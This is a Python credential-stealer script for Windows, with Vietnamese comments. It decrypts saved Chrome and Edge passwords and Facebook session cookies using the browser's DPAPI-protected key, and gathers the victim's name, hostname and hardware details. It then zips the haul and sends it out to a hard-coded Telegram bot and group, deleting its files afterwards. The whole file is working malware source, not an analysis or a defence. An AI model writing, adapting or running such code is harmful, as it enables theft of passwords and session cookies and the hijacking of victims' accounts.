#Full Credits to LimerBoy
import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import requests
import webbrowser
import datetime
import zipfile
import subprocess
import ctypes
import wmi





class SystemInfo:
    def __init__(self) -> None:
        # Gọi phương thức user_system_data() để lấy thông tin người dùng và hệ thống
        self.display_name, self.hostname, self.username, self.cpu, self.gpu, self.ram = self.user_system_data()

    def user_system_data(self) -> tuple[str, str, str, str, str, float]:
        # Hàm để lấy tên hiển thị của người dùng
        def display_name() -> str:
            GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
            NameDisplay = 3

            size = ctypes.pointer(ctypes.c_ulong(0))
            GetUserNameEx(NameDisplay, None, size)

            nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
            GetUserNameEx(NameDisplay, nameBuffer, size)

            return nameBuffer.value

        # Gọi hàm để lấy tên hiển thị của người dùng
        display_name = display_name()
        
        # Lấy thông tin máy tính và người dùng
        hostname = os.getenv('COMPUTERNAME')
        username = os.getenv('USERNAME')
        
        # Sử dụng WMI để lấy thông tin CPU, GPU và RAM
        cpu = wmi.WMI().Win32_Processor()[0].Name
        gpu = wmi.WMI().Win32_VideoController()[0].Name
        ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)

        return display_name, hostname, username, cpu, gpu, ram



#GLOBAL CONSTANT
# Đường dẫn đến tệp Local State của Chrome
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
EDG_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Local State"%(os.environ['USERPROFILE']))
# Đường dẫn đến thư mục dữ liệu người dùng của Chrome
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
EDG_PATH = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data"%(os.environ['USERPROFILE']))

# Hàm để lấy khóa bí mật từ Chrome
def get_secret_key(NAME_PATH_LOCAL_STATE):
    try:
        #(1) Lấy secret key từ local state của Chrome
        with open(NAME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Loại bỏ đuôi DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Không thể tìm thấy secret key của Chrome")
        return None
    
# Hàm để giải mã payload
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

# Hàm để tạo cipher
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

# Hàm để giải mã mật khẩu
def decrypt_password(ciphertext, secret_key):
    try:
        #(3-a) Vector khởi tạo cho việc giải mã AES
        initialisation_vector = ciphertext[3:15]
        #(3-b) Lấy mật khẩu đã mã hóa bằng cách loại bỏ các byte cuối cùng
        #Mật khẩu đã mã hóa là 192 bit
        encrypted_password = ciphertext[15:]
        #(4) Tạo cipher để giải mã ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass[:-16].decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Không thể giải mã, phiên bản Chrome <80 không được hỗ trợ. Vui lòng kiểm tra.")
        return ""
    
# Hàm để lấy kết nối đến cơ sở dữ liệu
def get_db_connection(chrome_path_login_db,name_copy_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, name_copy_db)     
        return sqlite3.connect(name_copy_db)
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Không thể tìm thấy cơ sở dữ liệu của Chrome")
        return None
        

# Token của bot
TOKEN_BOT = "7448635622:AAHd5jWK82jmU3-ixSmklG14wX7OeIYjFs8"

# ID của nhóm
TELEGRAM_GROUP_ID = "-4152341299"

# Function to send a file
def send_file(message,file_path):
    try:
        url = f'https://api.telegram.org/bot{TOKEN_BOT}/sendDocument'
        files = {'document': open(file_path, 'rb')}
        params = {'chat_id': TELEGRAM_GROUP_ID, 'caption': message}
        response = requests.post(url, files=files, data=params)
        if response.status_code == 200:
            print("File đã được gửi thành công.")
        else:
            print("Không thể gửi file.")
    except Exception as e:
        print(f"Lỗi khi gửi file: {e}")

def create_txt_file(file_path, content):
    try:
        with open(file_path, mode='w', encoding='utf-8') as txt_file:
            txt_file.write(content)
      
    except Exception as e:
        print(f"Lỗi khi tạo file văn bản: {e}")

def compress_files_to_zip(files, zip_file_name):
    with zipfile.ZipFile(zip_file_name, 'w') as zipf:
        for file in files:
            zipf.write(file)

# Sửa đổi chương trình chính để lấy và giải mã cookie
def getcookieschorm():
    try:
        secret_key = get_secret_key(CHROME_PATH_LOCAL_STATE)
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
        # csv_files = []
        files_to_compress = [] 
        for folder in folders:
            	#(2) Lấy bản mã từ cơ sở dữ liệu sqlite
                folder_name = folder.split('Profile ')[-1] 
                cookie_db = os.path.normpath(r"%s\%s\Network\Cookies" % (CHROME_PATH, folder))
                conn = get_db_connection(cookie_db,"cookie_coppy.db")
                if secret_key and conn:
                    cursor = conn.cursor()
                    name_value_pairs = []
                    cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
                    for index, cookie in enumerate(cursor.fetchall()):
                        url = cookie[0]
                        name = cookie[1]
                        path = cookie[2]
                        ciphertext = cookie[3]  # Thay đổi index tương ứng với encrypted_value
                        if  ".facebook.com" in url:
                            decrypted_value = decrypt_password(ciphertext, secret_key)  # Thay đổi hàm giải mã tùy thuộc vào cách mã hóa được sử dụng
                            name_value_pairs.append(repr(f"{name} = {decrypted_value};"))

                    result_string = ''.join([s.replace("'", "").replace('"', '') for s in name_value_pairs])
                    file_name = f'cookie-profile-{folder_name}.txt'

                    cursor.close()
                    conn.close()
                    os.remove("cookie_coppy.db")
                    create_txt_file(file_name, result_string)
                    files_to_compress.append(file_name) 

                    
        compress_files_to_zip(files_to_compress, "cookies_FB_CHORM.zip")
        
        # Xóa tất cả các tệp txt đã tạo
        for file in files_to_compress:
            os.remove(file)

            
     
            
    except Exception as e:
        print("[ERR] %s"%str(e))


#edg
def getcookies_edg():
    try:
        secret_key = get_secret_key(EDG_PATH_LOCAL_STATE)
        folders = [element for element in os.listdir(EDG_PATH) if re.search("^Profile*|^Default$",element)!=None]
        # csv_files = []
        files_to_compress = [] 
        for folder in folders:
            	#(2) Lấy bản mã từ cơ sở dữ liệu sqlite
                folder_name = folder.split('Profile ')[-1] 
                cookie_db = os.path.normpath(r"%s\%s\Network\Cookies" % (EDG_PATH, folder))
                conn = get_db_connection(cookie_db,"cookie_edg_coppy.db")
                if secret_key and conn:
                    cursor = conn.cursor()
                    name_value_pairs = []
                    cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
                    for index, cookie in enumerate(cursor.fetchall()):
                        url = cookie[0]
                        name = cookie[1]
                        path = cookie[2]
                        ciphertext = cookie[3]  # Thay đổi index tương ứng với encrypted_value
                        if  ".facebook.com" in url:
                            decrypted_value = decrypt_password(ciphertext, secret_key)  # Thay đổi hàm giải mã tùy thuộc vào cách mã hóa được sử dụng
                            name_value_pairs.append(repr(f"{name} = {decrypted_value};"))

                    result_string = ''.join([s.replace("'", "").replace('"', '') for s in name_value_pairs])
                    file_name = f'cookie-profile-{folder_name}.txt'

                    cursor.close()
                    conn.close()
                    os.remove("cookie_edg_coppy.db")
                    create_txt_file(file_name, result_string)
                    files_to_compress.append(file_name) 

                    
        compress_files_to_zip(files_to_compress, "cookiesFB_EDG.zip")
        
        # Xóa tất cả các tệp txt đã tạo
        for file in files_to_compress:
            os.remove(file)

            
     
            
    except Exception as e:
        print("[ERR] %s"%str(e))



def getacc():
    try:
        #(1) Get secret key
        secret_key = get_secret_key(CHROME_PATH_LOCAL_STATE)

        #Tìm kiếm hồ sơ người dùng hoặc thư mục mặc định (đây là nơi lưu trữ mật khẩu đăng nhập được mã hóa)
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
        csv_files = []
        for folder in folders:
            profile_name = folder.split('Profile ')[-1]  # Lấy phần số cuối cùng từ tên thư mục
            profile_name = f"Profile-{profile_name}"  # Đặt tên file dựa trên số của profile
            csv_file_name = f'decrypted_password_{profile_name}.csv'  # Tạo tên file với tên profile
            
            #Create Dataframe to store passwords
            with open(csv_file_name, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
                csv_writer = csv.writer(decrypt_password_file, delimiter=',')
                csv_writer.writerow(["index","url","username","password"])
                
                # Lấy bản mã từ cơ sở dữ liệu sqlite
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))

                conn = get_db_connection(chrome_path_login_db,"chorm_coppy.db")
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url!="" and username!="" and ciphertext!=""):
                            # Giải mã mật khẩu
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            csv_writer.writerow([index,url,username,decrypted_password])
                    
                    # Đóng kết nối với cơ sở dữ liệu
                    cursor.close()
                    conn.close()
                    os.remove("chorm_coppy.db") 
                csv_files.append(csv_file_name) 
            compress_files_to_zip(csv_files, 'passes_CHORM.zip')
        for csv_file in csv_files:
            os.remove(csv_file)
    except Exception as e:
        print("[ERR] %s"%str(e))

def getacc_edg():
    try:
        #(1) Get secret key
        secret_key = get_secret_key(EDG_PATH_LOCAL_STATE)

        #Tìm kiếm hồ sơ người dùng hoặc thư mục mặc định (đây là nơi lưu trữ mật khẩu đăng nhập được mã hóa)
        folders = [element for element in os.listdir(EDG_PATH) if re.search("^Profile*|^Default$",element)!=None]
        csv_files = []
        for folder in folders:
            profile_name = folder.split('Profile ')[-1]  # Lấy phần số cuối cùng từ tên thư mục
            profile_name = f"Profile-{profile_name}"  # Đặt tên file dựa trên số của profile
            csv_file_name = f'decrypted_password_{profile_name}.csv'  # Tạo tên file với tên profile
            
            #Create Dataframe to store passwords
            with open(csv_file_name, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
                csv_writer = csv.writer(decrypt_password_file, delimiter=',')
                csv_writer.writerow(["index","url","username","password"])
                
                # Lấy bản mã từ cơ sở dữ liệu sqlite
                edg_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(EDG_PATH,folder))

                conn = get_db_connection(edg_path_login_db,"edg_coppy.db")
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url!="" and username!="" and ciphertext!=""):
                            # Giải mã mật khẩu
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            csv_writer.writerow([index,url,username,decrypted_password])
                    
                    # Đóng kết nối với cơ sở dữ liệu
                    cursor.close()
                    conn.close()
                    os.remove("edg_coppy.db") 
                csv_files.append(csv_file_name) 
            compress_files_to_zip(csv_files, 'passes_EDG.zip')
        for csv_file in csv_files:
            os.remove(csv_file)
    except Exception as e:
        print("[ERR] %s"%str(e))



if __name__ == '__main__':
    try:
        # Gọi hàm để tạo hai tệp zip
        getcookieschorm()
        getcookies_edg()
        getacc_edg()
        getacc()
        system_info = SystemInfo()
        
        # Nén hai tệp zip thành một tệp zip mới
        with zipfile.ZipFile(f"{system_info.display_name}tt.zip", 'w') as zipf:
            if os.path.exists("cookies_FB_CHORM.zip"):
                zipf.write("cookies_FB_CHORM.zip")
            if os.path.exists("cookiesFB_EDG.zip"):
                zipf.write("cookiesFB_EDG.zip")
            if os.path.exists("passes_CHORM.zip"):
                zipf.write("passes_CHORM.zip")
            if os.path.exists("passes_EDG.zip"):
                zipf.write("passes_EDG.zip")

            
        message = f"""
👤Display Name--: {system_info.display_name}
👤Hostname--: {system_info.hostname}
👤Username--: {system_info.username}
💻CPU--: {system_info.cpu}
💻GPU--: {system_info.gpu}
💻RAM--: {system_info.ram}
"""
                
        send_file(message, f"{system_info.display_name}tt.zip")
                        

    except Exception as e:
        print("[ERR] %s" % str(e))
    finally:
        # Xóa các tệp zip ban đầu sau khi đã sử dụng xong
        if os.path.exists("cookies_FB_CHORM.zip"):
            os.remove("cookies_FB_CHORM.zip")
        if os.path.exists("cookiesFB_EDG.zip"):
            os.remove("cookiesFB_EDG.zip")
        if os.path.exists("passes_CHORM.zip"):
            os.remove("passes_CHORM.zip")
        if os.path.exists("passes_EDG.zip"):
            os.remove("passes_EDG.zip")
        if os.path.exists(f"{system_info.display_name}tt.zip"):
            os.remove(f"{system_info.display_name}tt.zip")
